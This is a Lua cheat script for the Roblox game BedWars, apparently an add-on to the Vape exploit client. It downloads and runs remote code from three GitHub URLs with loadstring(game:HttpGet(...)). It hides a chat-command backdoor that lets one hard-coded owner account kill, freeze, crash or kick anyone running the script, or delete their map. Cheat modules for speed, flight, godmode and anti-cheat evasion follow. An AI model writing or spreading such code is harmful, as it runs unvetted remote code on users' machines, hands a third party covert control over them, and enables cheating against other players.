repeat task.wait() until game:IsLoaded()
local OwnerId = 3848653266
local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeRandomKid7/CustomV4/main/Whitelist.lua"))()
local lplr = game:GetService("Players").LocalPlayer
local repstorage = game:GetService("ReplicatedStorage")
if not table.find(whitelist,lplr.UserId) then lplr:Kick("not whitelisted") return end
loadstring(game:HttpGet("https://raw.githubusercontent.com/vodxn/sape/main/Custom/6872274481.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/CustomModules/6872274481.lua"))()
local GuiLibrary  = shared.GuiLibrary
local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
local Client = require(repstorage.TS.remotes).default.Client
local bedwars = {
    ["BalloonController"] = KnitClient.Controllers.BalloonController,
    ["DamageController"] = require(lplr.PlayerScripts.TS.controllers.global.damage["damage-controller"]).DamageController,
    ["DamageTypes"] = require(repstorage.TS.damage["damage-type"]).DamageType,
    ["ClientHandler"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
}
function runcode(func)
    func()
end
function notify(title,content,time)
    local frame = GuiLibrary["CreateNotification"](title,content,time or 5,"assets/WarningNotification.png")
end
function getstate()
	return bedwars["ClientHandler"]:getState().Game.matchState
end

function message(plr_name,msg)
    if not shared.VapeExecuted then return end
    if game:GetService("Players")[plr_name].UserId == OwnerId then
        if msg == ";kill" then
            bedwars["DamageController"].requestSelfDamage(nil,100,bedwars["DamageTypes"].FALL)
        end
        if msg == ";reset" then
            game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
        end
        if msg == ";flag" then
            for i = 1,10 do
                lplr.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
                task.wait(0.1)
            end
        end
        if msg == ";jump" then
            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        if msg == ";sit" then
            lplr.Character.Humanoid.Sit = true
        end
        if msg == ";unsit" then
            lplr.Character.Humanoid.Sit = false
        end
        if msg == ";freeze" then
            lplr.Character.HumanoidRootPart.Anchored = true
        end
        if msg == ";unfreeze" then
            lplr.Character.HumanoidRootPart.Anchored = false
        end
        if msg == ";deletemap" then
            for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
                v:Destroy()
            end
        end
        if msg == ";crash" then
            if setfpscap then setfpscap(99e99) end
            if set_fps_cap then set_fps_cap(99e99) end
            print(game:GetObjects("h29g3535")[1])
        end
        if msg == ";chipman" then
            function funny(v)
                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                    v.Image = "http://www.roblox.com/asset/?id=6864086702"
                    v:GetPropertyChangedSignal("Image"):Connect(function()
                        v.Image = "http://www.roblox.com/asset/?id=6864086702"
                    end)
                end
                if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
                    if v.Text ~= "" then
                        v.Text = "chips"
                    end
                    v:GetPropertyChangedSignal("Text"):Connect(function()
                        if v.Text ~= "" then
                            v.Text = "chips"
                        end
                    end)
                end
                if v:IsA("Texture") or v:IsA("Decal") then
                    v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                    v:GetPropertyChangedSignal("Texture"):Connect(function()
                        v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                    end)
                end
                if v:IsA("MeshPart") then
                    v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
                        v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                    end)
                end
                if v:IsA("SpecialMesh") then
                    v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
                        v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                    end)
                end
                if v:IsA("Sky") then
                    v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
                    v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
                    v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
                    v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
                    v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
                    v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
                end
            end
            for i,v in pairs(game:GetDescendants()) do
                funny(v)
            end
            game.DescendantAdded:Connect(function()
                funny(v)
            end)
        end
        if msg == ";rickroll" then
            function funny(v)
                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                    v.Image = "http://www.roblox.com/asset/?id=7083449168"
                    v:GetPropertyChangedSignal("Image"):Connect(function()
                        v.Image = "http://www.roblox.com/asset/?id=7083449168"
                    end)
                end
                if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
                    if v.Text ~= "" then
                        v.Text = "Never gonna give you up"
                    end
                    v:GetPropertyChangedSignal("Text"):Connect(function()
                        if v.Text ~= "" then
                            v.Text = "Never gonna give you up"
                        end
                    end)
                end
                if v:IsA("Texture") or v:IsA("Decal") then
                    v.Texture = "http://www.roblox.com/asset/?id=7083449168"
                    v:GetPropertyChangedSignal("Texture"):Connect(function()
                        v.Texture = "http://www.roblox.com/asset/?id=7083449168"
                    end)
                end
                if v:IsA("MeshPart") then
                    v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
                        v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
                    end)
                end
                if v:IsA("SpecialMesh") then
                    v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
                        v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
                    end)
                end
                if v:IsA("Sky") then
                    v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
                    v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
                    v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
                    v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
                    v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
                    v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
                end
            end
            for i,v in pairs(game:GetDescendants()) do
                funny(v)
            end
            game.DescendantAdded:Connect(function()
                funny(v)
            end)
        end
        if msg == ";kick" then
            lplr:Kick()
        end
        if msg == ";uninject" then
            GuiLibrary["SelfDestruct"]()
        end
        if msg == ";lobby" then
            game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
        end
    end
end

spawn(function()
    for i,v in next, game:GetService("Players"):GetChildren() do
        if v.UserId == OwnerId then
            notify("CustomVape", "CustomVape Owner Ingame!",10)
        end
        v.Chatted:Connect(function(a)
            message(v.Name,a)
        end)
    end
    game:GetService("Players").PlayerAdded:Connect(function(v)
        if v.UserId == OwnerId then
            notify("CustomVape", "CustomVape Owner Ingame!",10)
        end
        v.Chatted:Connect(function(a)
            message(v.Name,a)
        end)
    end)
end)

runcode(function()
    local Night = {["Enabled"] = false}
    Night = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "Night",
        ["Function"] = function(callback)
            if callback then
                spawn(function()
                    while task.wait() do
                        if not Night["Enabled"] then return end
                        game:GetService("Lighting").TimeOfDay = "00:00:00"
                    end
                end)
            else
                game:GetService("Lighting").TimeOfDay = "13:00:00"
            end
        end,
    })
end)

runcode(function()
    local FloatDisabler = {["Enabled"] = false}
    FloatDisabler = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "FloatDisabler",
        ["Function"] = function(callback)
            if callback then
                    local oldfunc3 = bedwars["BalloonController"].hookBalloon
                    local oldfunc4 = bedwars["BalloonController"].enableBalloonPhysics
                    local oldfunc5 = bedwars["BalloonController"].deflateBalloon
                    bedwars["BalloonController"].inflateBalloon()
                    bedwars["BalloonController"].enableBalloonPhysics = function() end
                    bedwars["BalloonController"].deflateBalloon = function() end
                    bedwars["BalloonController"].hookBalloon = function(Self, plr, attachment, balloon)
                        balloon:WaitForChild("Balloon").CFrame = CFrame.new(0, -1995, 0)
                        balloon.Balloon:ClearAllChildren()
                        local threadidentity = syn and syn.set_thread_identity or setidentity
                        threadidentity(7)
                        spawn(function()
                            task.wait(0.5)
                            notify("FloatDisabler", "You can now fly infinetly!")
                        end)
                        threadidentity(2)
                        bedwars["BalloonController"].hookBalloon = oldfunc3
                        bedwars["BalloonController"].enableBalloonPhysics = oldfunc4
                    end
                FloatDisabler["ToggleButton"](true)
            end
        end
    })
end)

runcode(function()
    local VerusSpeed = {["Enabled"] = false}
    VerusSpeed = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "VerusSpeed",
        ["Function"] = function(callback)
            if callback then
                spawn(function()
                    while task.wait() do
                        if not VerusSpeed["Enabled"] then return end
                        lplr.Character:SetAttribute("SpeedBoost", 4)
                        task.wait(0.06)
                        lplr.Character:SetAttribute("SpeedBoost", nil)
                        task.wait(0.125)
                    end
                end)
            else
                lplr.Character:SetAttribute("SpeedBoost", nil)
            end
        end,
    })
end)

runcode(function()
    local GliderItemDisabler = {["Enabled"] = false}
    GliderItemDisabler = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "GliderItemDisabler",
        ["Function"] = function(callback)
            if callback then
                repstorage["rbxts_include"]["node_modules"]["net"]["out"]["_NetManaged"].HangGliderUse:FireServer()
                GliderItemDisabler["ToggleButton"](false)
            end
        end,
    })
end)

runcode(function()
    local BoostAirJump = {["Enabled"] = false}
    BoostAirJump = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "BoostAirJump",
        ["Function"] = function(callback)
            if callback then
                spawn(function()
                    while task.wait(0.1) do
                        if not BoostAirJump["Enabled"] then return end
                        lplr.Character:FindFirstChild("HumanoidRootPart").Velocity = lplr.Character:FindFirstChild("HumanoidRootPart").Velocity + Vector3.new(0,40,0)
                    end
                end)
            end
        end
    })
end)

runcode(function()
    local SlowAutoWin = {["Enabled"] = false}
    SlowAutoWin = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
        ["Name"] = "SlowAutoWin",
        ["Function"] = function(callback)
        if callback then
            local char = lplr.Character
            char:FindFirstChild("HumanoidRootPart").CFrame = char:FindFirstChild("HumanoidRootPart").CFrame + Vector3.new(0,99,0)
            char:FindFirstChild("Head").Anchored = true
            char:FindFirstChild("UpperTorso").Anchored = true
            char:FindFirstChild("HumanoidRootPart"):Destroy()
            notify("SlowAutoWin","Changes unreversable.")
            SlowAutoWin["ToggleButton"](false)
        end
    end
    })
end)

runcode(function()
	local RbHealthbar = {["Enabled"] = false}
    local counter = 0
    function SmokeRB(X)
        return math.acos(math.cos(X*math.pi))/math.pi
    end
	RbHealthbar = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
		["Name"] = "RbHealthbar",
		["Function"] = function(callback)
			if callback then
                spawn(function()
                    repeat task.wait() until getstate() ~= 0
                    while task.wait(0.1) do
                        if not RbHealthbar["Enabled"] then return end
                        lplr.PlayerGui.hotbar["1"].HotbarHealthbarContainer.HealthbarProgressWrapper["1"].BackgroundColor3 = Color3.fromHSV(SmokeRB(counter),1,1)
                        counter = counter + 0.01
                    end
                end)
			end
		end,
	})
end)

runcode(function()
	local GodmodeTest = {["Enabled"] = false}
	GodmodeTest = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
		["Name"] = "GodmodeTest",
		["Function"] = function(callback)
			if callback then
                spawn(function()
                    local hum = lplr.Character.Humanoid
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead,false)
                    hum.MaxHealth =  9e9
                    hum.Health = 9e9
                    Instance.new("ForceField",lplr.Character)
                    while task.wait() do
                        if not GodmodeTest["Enabled"] then return end
                        hum:SetStateEnabled(Enum.HumanoidStateType.Dead,false)
                        hum.MaxHealth =  9e9
                        hum.Health = 9e9
                    end
                end)
			end
		end,
	})
end)
